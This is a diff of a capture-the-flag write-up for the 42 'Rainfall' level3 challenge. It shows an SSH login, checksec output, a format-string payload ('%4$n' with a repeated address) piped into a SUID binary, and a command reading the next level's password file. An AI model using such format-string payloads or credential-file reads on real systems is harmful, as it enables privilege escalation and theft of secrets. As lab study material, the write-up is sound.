@@ -1,17 +1,7 @@
 Login as `level3`.
 ```shell
-┌──$ [~/42/2021/rainfall]
+┌──$ [~/42/2022/rainfall]
 └─>  ssh 192.168.1.28 -p 4242 -l level3
-	  _____       _       ______    _ _
-	 |  __ \     (_)     |  ____|  | | |
-	 | |__) |__ _ _ _ __ | |__ __ _| | |
-	 |  _  /  _` | | '_ \|  __/ _` | | |
-	 | | \ \ (_| | | | | | | | (_| | | |
-	 |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|
-
-                 Good luck & Have fun
-
-  To start, ssh with level0/level0 on :4242
 level3@192.168.1.28's password: 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
   GCC stack protector support:            Enabled
   Strict user copy checks:                Disabled
@@ -23,7 +13,7 @@ level3@192.168.1.28's password: 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b071
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level3/level31
 ```
-A `SUID` executable is located in the home directory.
+A `SUID` executable is lcated in the home directory.
 ```shell
 level3@RainFall:~$ ls -l
 total 8
@@ -107,8 +97,11 @@ level4
 cat /home/user/level4/.pass
 b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
 ```
-64/4=16
-Offset between 4 and 19 could be used to write 64 in m
+> 64/4=16
+> Offset between 4 and 19 could be used to write 64 bytes.
+
+Exploit and log on to the next level.
+
 ```gdb
 level3@RainFall:~$ (python -c "print '\x8c\x98\x04\x08'*16 + '%4\$n'"; echo "cat /home/user/level4/.pass") | ./level3
 �����������������
